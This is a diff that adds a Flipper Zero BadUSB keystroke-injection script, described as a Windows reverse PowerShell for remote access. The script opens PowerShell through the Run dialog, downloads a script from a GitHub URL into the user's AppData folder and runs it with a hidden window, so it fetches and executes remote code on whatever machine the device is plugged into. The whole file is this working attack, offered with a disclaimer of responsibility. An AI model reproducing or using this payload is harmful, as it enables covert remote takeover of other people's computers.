@@ -1,0 +1,18 @@
+REM Author: Claquetteuuuh ("ClaquetteuuuH#8986 on Discord)
+REM Description: Reverse-PowerShell Windows. I am not responsible for your actions.
+REM Version: 1.0
+REM Category: Remote_Access
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING wget "https://github.com/Claquetteuuuh/flipper-zero/blob/main/badusb/Pawn/conf.ps1?raw=true" -outFile "$env:AppData\Microsoft\conf.ps1"
+DELAY 1500
+ENTER
+DELAY 750
+STRING powershell.exe -windowstyle hidden -File "$env:AppData\Microsoft\conf.ps1"
+ENTER
+STRING exit
+ENTER
